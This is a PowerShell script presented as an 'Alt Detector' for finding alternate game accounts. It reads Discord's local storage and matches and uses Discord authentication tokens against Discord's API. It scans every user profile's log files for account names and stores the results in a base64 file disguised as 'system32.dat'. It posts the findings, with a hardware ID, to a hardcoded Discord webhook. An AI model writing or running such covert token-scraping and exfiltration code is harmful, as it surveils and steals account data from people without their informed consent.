$webhookUrl = "https://discord.com/api/webhooks/1484711697565614150/KHVQI7KIhvUOchJE2srJIznPqtJdULv-Y9yjGE-Zghi5R5ersc65sJNGl5CdABYVT0Oa"
$startPath = "C:\Users"
$hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
$hwidFile = "$hwidFolder\system32.dat"

# Create folder if it doesn't exist
if (-not (Test-Path $hwidFolder)) {
    New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null
}

# Get HWID only
function Get-HWID {
    try {
        $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
        $uuid = $computerInfo.UUID
        $drive = Get-WmiObject Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        $driveSerial = $drive.SerialNumber
        $hwid = "$uuid-$driveSerial"
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
        return $hash -replace '-', ''
    }
    catch {
        return $env:COMPUTERNAME
    }
}

$hwid = Get-HWID

# Get Discord username from multiple sources (improved)
function Get-DiscordUsername {
    $username = "Unknown"
    
    # Method 1: Check Discord's leveldb files for username
    try {
        $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
        if (Test-Path $discordPath) {
            $files = Get-ChildItem -Path $discordPath -Filter "*.log" -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                # Look for username patterns in Discord data
                if ($content -match '"username":"([^"]+)"') {
                    $username = $Matches[1]
                    return $username
                }
                if ($content -match '"global_name":"([^"]+)"') {
                    $username = $Matches[1]
                    return $username
                }
                if ($content -match '"tag":"([^"]+)"') {
                    $username = $Matches[1]
                    return $username
                }
                # Look for email or user ID patterns
                if ($content -match '"user_id":"([^"]+)"') {
                    # If we find user_id but not username, we can try to get it from Discord API later
                }
            }
        }
    } catch {}
    
    # Method 2: Check Discord's settings file
    try {
        $settingsPath = "$env:APPDATA\discord\settings.json"
        if (Test-Path $settingsPath) {
            $settings = Get-Content $settingsPath -Raw -ErrorAction SilentlyContinue
            if ($settings -match '"username":"([^"]+)"') {
                $username = $Matches[1]
                return $username
            }
        }
    } catch {}
    
    # Method 3: Check Discord's Local State file
    try {
        $localStatePath = "$env:APPDATA\discord\Local State"
        if (Test-Path $localStatePath) {
            $localState = Get-Content $localStatePath -Raw -ErrorAction SilentlyContinue
            if ($localState -match '"username":"([^"]+)"') {
                $username = $Matches[1]
                return $username
            }
        }
    } catch {}
    
    # Method 4: Check for Discord token to get username from API
    try {
        $tokenFiles = Get-ChildItem -Path "$env:APPDATA\discord\Local Storage\leveldb" -Filter "*.log" -ErrorAction SilentlyContinue
        foreach ($file in $tokenFiles) {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match 'dQw4w9WgXcQ:[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') {
                $token = $Matches[0]
                try {
                    $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers @{Authorization = $token} -ErrorAction SilentlyContinue
                    if ($userInfo.username) {
                        $username = $userInfo.username
                        return $username
                    }
                } catch {}
            }
        }
    } catch {}
    
    return $username
}

$discordUser = Get-DiscordUsername

# Load stored alts
$storedAlts = @{}
if (Test-Path $hwidFile) {
    try {
        $encrypted = Get-Content $hwidFile -Raw
        $bytes = [System.Convert]::FromBase64String($encrypted)
        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
        $storedAlts = $decrypted | ConvertFrom-Json
    }
    catch {
        $storedAlts = @{}
    }
}

if (-not (Test-Path $startPath)) {
    exit
}

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$newAlts = @()
$allFoundAlts = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            
            $gzipStream.Close()
            $outputStream.Close()
            $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            $allFoundAlts += $username
            if (-not $storedAlts.ContainsKey($username)) {
                $newAlts += $username
            }
        }
    }
    catch {
        continue
    }
}

# Save new alts
if ($newAlts.Count -gt 0) {
    foreach ($alt in $newAlts) {
        $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    }
    
    $json = $storedAlts | ConvertTo-Json
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $encrypted = [System.Convert]::ToBase64String($bytes)
    Set-Content -Path $hwidFile -Value $encrypted -Force
}

# Always show alts and Discord username
$description = "**Discord Account:** $discordUser`n`n"

if ($newAlts.Count -gt 0) {
    Write-Host "`nNew alts found:" -ForegroundColor Cyan
    $counter = 1
    $description += "**NEW ALTS FOUND:**`n`n"
    foreach ($username in $newAlts | Select-Object -Unique) {
        Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
        $description += "$counter. $username`n"
        $counter++
    }
    
    if ($storedAlts.Count - $newAlts.Count -gt 0) {
        $description += "`n**PREVIOUSLY DETECTED ALTS:**`n`n"
        $counter = 1
        $oldAlts = $storedAlts.Keys | Where-Object { $_ -notin $newAlts }
        foreach ($username in $oldAlts) {
            $description += "$counter. $username`n"
            $counter++
        }
    }
    
    $title = "ALT ACCOUNTS DETECTED"
    $color = 0x9B59B6
} else {
    Write-Host "No new alts found." -ForegroundColor Yellow
    $description += "**NO NEW ALTS FOUND**`n`n"
    
    if ($storedAlts.Count -gt 0) {
        $description += "**PREVIOUSLY DETECTED ALTS:**`n`n"
        $counter = 1
        foreach ($username in $storedAlts.Keys) {
            Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
            $description += "$counter. $username (First seen: $($storedAlts[$username]))`n"
            $counter++
        }
    } else {
        $description += "No alt accounts have ever been detected on this system."
    }
    
    $title = "ALT ACCOUNTS CHECK"
    $color = 0x3498DB
}

# Create embed
$embed = @{
    title = $title
    color = $color
    description = $description
    footer = @{
        text = "HWID: $hwid"
    }
    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
}

# Send to Discord
$payload = @{
    embeds = @($embed)
    username = "Alt Detector"
} | ConvertTo-Json -Depth 3

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
Write-Host "Results sent to Discord!" -ForegroundColor Green
